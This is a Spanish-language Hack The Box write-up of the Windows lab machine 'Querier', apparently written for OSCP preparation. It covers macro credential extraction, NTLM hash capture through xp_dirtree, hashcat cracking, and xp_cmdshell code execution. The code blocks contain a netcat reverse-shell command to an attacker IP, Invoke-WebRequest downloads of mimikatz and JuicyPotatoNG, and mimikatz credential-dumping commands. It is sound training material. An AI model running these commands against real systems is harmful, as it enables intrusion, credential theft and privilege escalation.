# Querier

![](../../../../~gitbook/image.md)Publicado: 13 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Querier es una máquina Windows de dificultad media que simula un entorno corporativo con servicios SQL Server y SMB. La explotación inicial se basa en el análisis de un archivo Excel con macros maliciosas encontrado en un recurso compartido SMB, que revela credenciales de base de datos. Posteriormente, se aprovecha la funcionalidad de autenticación NTLM del SQL Server para capturar hashes y realizar ataques de fuerza bruta. La escalada de privilegios se logra mediante la explotación del privilegio `SeImpersonatePrivilege` utilizando técnicas de Token Impersonation con JuicyPotatoNG.Conceptos clave:- 🔍 Análisis de metadatos y macros en documentos Office
- 🗄️ Explotación de SQL Server con xp_cmdshell
- 🔑 Captura de hashes NTLM mediante NTLM Relay
- 🚀 Escalada de privilegios con SeImpersonatePrivilege

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🔍 Escaneo de puertos

####🛠️ Enumeración de servicios

###🎯 Enumeración de Servicios

####📁 Puerto 445 TCP - SMB
Dado que no disponemos de credenciales, tratamos de enumerar posibles recursos compartidos haciendo uso de una null sessionNos conectamos al recurso compartido Reports y enumeramos su contenido y descargamos el archivo encontrado:📊 Análisis del archivo ExcelUna vez descargado, usamos el comando `file` el tipo de archivo:Abrimos el documento pero está vacío, así que revisamos los metadatos usando la herramienta `exiftool` y descubrimos un usuario llamado Luis y que el archivo contiene una macro:![](../../../../~gitbook/image.md)Para revisar esto más en profundidad y analizar la macro podemos usar la herramienta olevba que podemos descargar de https://raw.githubusercontent.com/decalage2/oletools/refs/heads/master/oletools/olevba.pySi es la primera vez que la instalamos, deberemos instalar algunas dependencias e idealmente es mejor usar un entorno virtual con pyenv.Una ves instalada, ejecutamos la herramienta:En los resultados, vemos que la macro contiene una cadena de conexión a una base de datos Microsoft SQL Server:- Servidor (Server): `QUERIER`
- Base de datos (Database): `volume`
- Usuario (Uid): `reporting`
- Contraseña (Pwd): `PcwTWTHRwryjc$c6`
- Trusted_Connection: `no` (lo cual indica que no se está utilizando autenticación integrada de Windows, sino autenticación SQL Server con usuario y contraseña)

####🗄️ Explotación de SQL Server

####🔐 Conexión inicial con credenciales
Dado que la máquina expone un servicio Microsoft SQL Server, podemos aprovechar para probar las credenciales que hemos obtenido en el paso anterior.Usaremos la herramienta impacket-mssqlclient para realizar la conexión:![](../../../../~gitbook/image.md)🔍 Enumeración de la base de datos![](../../../../~gitbook/image.md)Verificamos si podemos habilitar `xp_cmdshell` para la ejecución de comandos, pero comprobamos que no tenemos los privilegios adecuados:![](../../../../~gitbook/image.md)🎣 Captura de hash NTLMOptamos por buscar otra vía potencial de ataque. Podemos iniciar un servidor smb con impacket y hacer una petición a un recurso inexistente obligando al usuario del host querier a autenticarse contra nuestra máquina obteniendo así el hash NTLMv2 del usuario, ya que aunque no podemos autenticarnos con este tipo de hash sí que puede ser vulnerable a ataques de fuerza bruta o diccionario.Para ello, iniciamos primero el servidor smb en nuestro host de ataque usando impacket-smbserver:A continuación, desde la consola MSSQL a la que hemos ganado acceso, hacemos la petición y obtnenemos el hash NTLMv2![](../../../../~gitbook/image.md)🔓 Crackeo de hash NTLMObtenemos el hash. Verificamos el tipo de hash y el código para intentar crackearlo con hashcat:![](../../../../~gitbook/image.md)Logramos obtener la contraseña crackeando el hash usando hashcat y el diccionario rockyou:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Querier/7.png]]🔑 Nueva credencial obtenida:- Usuario: `mssql-svc`
- Contraseña: `corporate568`

####💥 Escalada de Privilegios en SQL Server
🔐 Reconexión con nuevas credencialesAhora, nos autenticamos nuevamente en el servicio mssql usando impacket con las nuevas credenciales obtenidas:⚡ Habilitación de xp_cmdshellProbamos a ver si este usuario sí que tiene los previlegios adecuados para habilitar xp_cmdshell y vemos que sí, lo cual es una buena señal y una vía potencial para llevar a cabo una RCE:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Querier/9.png]]Confirmamos que ya podemos ejecutar comandos![](../../../../~gitbook/image.md)
####🚀 Explotación de RCE
🔄 Configuración de reverse shellCon `xp_cmdshell` se puede ejecutar un programa como `netcat` desde un recurso compartido y asi tener una revershell , usamos `impacket-smbserver` y nos ponemos en escuhca con
Ahora, desde la sesión mssql podemos usar IEX para ejecutar directamente el script:Copiamos nc.exe al directorio donde habíamos iniciado previamente el servidor smbserver en el recurso smbShare:![](../../../../~gitbook/image.md)Iniciamos un listener en nuestro host de ataque usando netcat:Ejecutamos la reverse shell usando netcat desde el recurso compartido contra nuestro host de ataque:Recibimos la reverse shell:![](../../../../~gitbook/image.md)Obtenemos la primera flag en el directorio Desktop del usuario mssql-svc
####🎯 Escalada de Privilegios Final
🔍 Enumeración de privilegiosTras enumerar la máquina y no encontrar ningún recurso que nos sirva como una vía potencial para la escalada, enumeramos los privilegios del usuario mssql-svc y vemos que tiene habilitado el privilegioSeImpersonatePrivilege:![](../../../../~gitbook/image.md)Enumeramos también la versión del sistema:![](../../../../~gitbook/image.md)Uso de MimikatzPodemos probar primero con mimikatz para ver si podemos hacer**Token Kidnapping **Mimikatz puede usar este privilegio para "robar" tokens de procesos privilegiados y ejecutar comandos como SYSTEM.Vamos a ello.Transferimos mimikatz al directorio C:\TempPero cuando lo ejecutamos lo detecta el antivirus y lo borra:![](../../../../~gitbook/image.md)🥔 Uso de JuicyPotatoNGOtra alternativa es usar Juicy Potato / Rotten Potato / Juicy PotatoNG:Son Herramientas que explotan la capacidad de impersonar el token de un servicio con privilegios SYSTEM a través del SeImpersonatePrivilege para elevar privilegios a SYSTEM. Necesitas encontrar servicios COM o DCOM mal configurados.🔸 Rotten Potato (original - desactualizado)- Explotaba DCOM/RPC para obtener tokens SYSTEM.
- Ya no funciona en versiones modernas de Windows (post-Win10/Server 2016).
🔸 Juicy Potato- Reimplementación mejorada que busca CLSIDs de servidores COM vulnerables.
- Compatible con Windows 7, 8, 10, Server 2008-2016.
- Necesita:Puerto TCP libre para la conexión COM inversa.
- Un CLSID válido de un servicio COM que devuelva un token SYSTEM.
🔸 Juicy Potato NG (Next Generation)- Funciona en Windows 10/11 y Server 2019/2022.
- Ya no usa DCOM clásico: explota NTLM relay interno hacia servicios como `DCOM`, `RPCSS`, etc.
- Más evasivo, y aún funcional en entornos endurecidos.
- Requiere:Acceso a la red local.
- Lanzamiento desde servicios que usen impersonation (como IIS, servicios web o binarios instalados como servicio).
Dado que estamos en una máquina Windows Server 2019 como ya enumeramos anteriormente, usaremos Juciy Potato NGTransferimos el exploit al host Querier usando powershell y usando el servidor web con python de nuestro host de ataque:Ejecutamos el exploit para obtener una consola con privilegios de administrador y obtener la última flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🎯 Enumeración de Servicios](#enumeracion-de-servicios-1)

```
❯ ping -c2 10.10.10.125
PING 10.10.10.125 (10.10.10.125) 56(84) bytes of data.
64 bytes from 10.10.10.125: icmp_seq=1 ttl=127 time=132 ms
64 bytes from 10.10.10.125: icmp_seq=2 ttl=127 time=114 ms

--- 10.10.10.125 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 114.123/123.303/132.483/9.180 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.125 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671
```

```
nmap -sC -sV -p$ports 10.10.10.125 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 13:42 CEST
Nmap scan report for 10.10.10.125
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-12T02:23:01
|_Not valid after:  2055-06-12T02:23:01
| ms-sql-ntlm-info:
|   10.10.10.125:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-06-13T11:45:38+00:00; +1m48s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-13T11:45:30
|_  start_date: N/A
|_clock-skew: mean: 1m47s, deviation: 0s, median: 1m47s
| smb2-security-mode:
|   3:1:1:

```

```
smbclient -N -L //10.10.10.125

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reports         Disk
Reconnecting with SMB1 for workgroup listing.
```

```
smbclient \\\\10.10.10.125\\Reports
```

```
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Tue Jan 29 00:23:48 2019
..                                  D        0  Tue Jan 29 00:23:48 2019
Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

5158399 blocks of size 4096. 818949 blocks available
smb: \>

smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (64.2 KiloBytes/sec) (average 64.2 KiloBytes/sec)
smb: \>
```

```
file Currency\ Volume\ Report.xlsm
Currency Volume Report.xlsm: Microsoft Excel 2007+
```

```
exiftool Currency\ Volume\ Report.xlsm
```

```
python3 olevba.py -c Currency\ Volume\ Report.xlsm
```

```

olevba 0.60.3 on Python 3.13.3 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

' MsgBox "connection successful"

'Set rs = conn.Execute("SELECT * @@version;")
Set rs = conn.Execute("SELECT * FROM volume;")
Sheets(1).Range("A1").CopyFromRecordset rs
rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
```

```
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)>
```

```
SELECT @@VERSION;
```

```
sp_configure 'show advanced options', 1
```

```
impacket-smbserver smbShare $(pwd) -smb2support
```

```
EXEC master..xp_dirtree '\\10.10.14.7\smbShare\'
```

```
hashcat -m 5600 -a 0 hash_ntlmv2_mssql_svc /usr/share/wordlists/rockyou.txt
```

```
impacket-mssqlclient mssql-svc:'corporate568'@10.10.10.125 -windows-auth
```

```
sp_configure 'show advanced options', 1
```

```
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami';
```

```
nc -nlvp 443
```

```
xp_cmdshell "\\10.10.14.7\smbShare\nc64.exe -e cmd 10.10.14.7 443"
```

```

C:\Users\mssql-svc\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 35CB-DA81

Directory of C:\Users\mssql-svc\Desktop

01/29/2019  12:42 AM              .
01/29/2019  12:42 AM              ..
06/12/2025  03:23 AM                34 user.txt
1 File(s)             34 bytes
2 Dir(s)   3,333,820,416 bytes free

C:\Users\mssql-svc\Desktop>
```

```
# Ejecutas mimikatz en la máquina
mimikatz # privilege::debug

# Enumeras procesos y tokens
sekurlsa::logonpasswords

# Usas token::elevate para usar SeImpersonatePrivilege y elevar
token::elevate

```

```
Invoke-WebRequest -Uri "http://10.10.14.7/mimikatz.exe" -OutFile "C:\Temp\mimikatz.exe"
```

```
wget https://github.com/x3m1Sec/PentestTools/raw/refs/heads/master/windows/JuicyPotatoNG.exe
```

```
Invoke-WebRequest -Uri "http://10.10.14.7/JuicyPotatoNG.exe" -OutFile "C:\Temp\JP.exe"
```

```
./JP.exe -t * -p "C:\Windows\System32\cmd.exe" -i
```
